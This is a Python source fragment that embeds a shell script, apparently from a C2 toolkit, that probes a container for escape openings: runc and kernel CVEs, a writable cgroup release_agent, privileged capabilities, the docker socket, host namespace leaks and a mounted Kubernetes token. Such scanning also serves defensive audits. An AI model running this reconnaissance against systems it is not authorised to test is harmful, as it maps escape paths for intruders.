# ── scan script ─────────────────────────────────────────────────────────────

_SCAN_SCRIPT = r"""#!/bin/sh
# webforg container CVE scan (Kubesploit-style) - generated by c2_ops
set +e
out() { printf 'CVE|%s|%s|%s\n' "$1" "$2" "$3"; }

# kernel version compare: kge MAJ MIN PAT  (exit 0 if kernel >= that version)
kge() {
  _v=$(uname -r)
  _maj=${_v%%\.*}; _v=${_v#*.}
  _min=${_v%%\.*}; _v=${_v#*.}
  _pat=${_v%%[!0-9]*}; _pat=${_pat:-0}
  [ "$_maj" -gt "$1" ] && return 0
  [ "$_maj" -lt "$1" ] && return 1
  [ "$_min" -gt "$2" ] && return 0
  [ "$_min" -lt "$2" ] && return 1
  [ "$_pat" -ge "$3" ]
}

K=$(uname -r 2>/dev/null)

# CVE-2019-5736 : runc before 1.0-rc6
RV=$(runc --version 2>/dev/null | sed -n 's/.*version \([0-9][^ ]*\).*/\1/p' | head -1)
case "$RV" in
  "")        out CVE-2019-5736 unknown "runc binary not found" ;;
  0.*|1.0.0-rc*) out CVE-2019-5736 possibly "runc $RV" ;;
  *)         out CVE-2019-5736 clean "runc $RV" ;;
esac

# CVE-2022-0492 : cgroup v1 writable release_agent
if [ -w /sys/fs/cgroup/release_agent ] && [ -f /sys/fs/cgroup/release_agent ]; then
  out CVE-2022-0492 vulnerable "/sys/fs/cgroup/release_agent writable"
elif [ -f /sys/fs/cgroup/release_agent ]; then
  out CVE-2022-0492 clean "release_agent read-only (cgroup v1)"
else
  out CVE-2022-0492 clean "cgroup v2 (no release_agent)"
fi

# CVE-2024-21626 : runc leaked workdir fd
FDHITS=$(ls -la /proc/self/fd/ 2>/dev/null | grep -c -E 'workdir|runc')
if [ "${FDHITS:-0}" -gt 0 ]; then
  out CVE-2024-21626 vulnerable "leaked runc workdir fd in /proc/self/fd"
else
  out CVE-2024-21626 clean "no leaked workdir fd"
fi

# CVE-2022-0847 : Dirty Pipe, kernel 5.8 <= k < 5.16.11
if kge 5 8 0 && ! kge 5 16 11; then
  out CVE-2022-0847 possibly "kernel $K (needs in-container root)"
else
  out CVE-2022-0847 clean "kernel $K"
fi

# CVE-2022-0185 : fs_context, kernel < 5.16.2
if kge 5 1 0 && ! kge 5 16 2; then
  out CVE-2022-0185 possibly "kernel $K"
else
  out CVE-2022-0185 clean "kernel $K"
fi

# CVE-2021-22555 : netfilter, kernel < 5.12
if kge 5 1 0 && ! kge 5 12 0; then
  out CVE-2021-22555 possibly "kernel $K"
else
  out CVE-2021-22555 clean "kernel $K"
fi

# privileged container (full capability mask)
CAP=$(awk '/^CapEff/{print $2}' /proc/self/status 2>/dev/null)
if [ -n "$CAP" ] && [ $((0x${CAP} & 0x3fffffffff)) -eq 1099511627775 ]; then
  out CTR-PRIV vulnerable "all caps set (CapEff=$CAP)"
else
  out CTR-PRIV clean "limited caps (CapEff=$CAP)"
fi

# docker socket
if [ -S /var/run/docker.sock ]; then
  out CTR-DOCKERSOCK vulnerable "/var/run/docker.sock present"
else
  out CTR-DOCKERSOCK clean "no docker socket"
fi

# host PID namespace
if [ -r /proc/1/root/etc/hostname ] 2>/dev/null; then
  out CTR-PIDLEAK vulnerable "host /proc/1 visible from container"
else
  out CTR-PIDLEAK clean "host PID namespace isolated"
fi

# host network
if [ -r /proc/1/net/arp ] 2>/dev/null; then
  out CTR-NETLEAK vulnerable "host network via /proc/1/net"
else
  out CTR-NETLEAK clean "host network isolated"
fi

# k8s service account
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
  out CTR-K8S-TOKEN vulnerable "k8s SA token mounted"
else
  out CTR-K8S-TOKEN clean "no k8s SA token"
fi

if [ -n "$KUBERNETES_SERVICE_HOST" ]; then
  out CTR-K8S-ENV possibly "k8s API at $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
else
  out CTR-K8S-ENV clean "no k8s metadata"
fi

# running as root
if [ "$(id -u 2>/dev/null)" = "0" ]; then
  out CTR-ROOT vulnerable "running as root (uid 0)"
else
  out CTR-ROOT clean "non-root"
fi

exit 0
"""


def build_scan_script() -> str:
    return _SCAN_SCRIPT


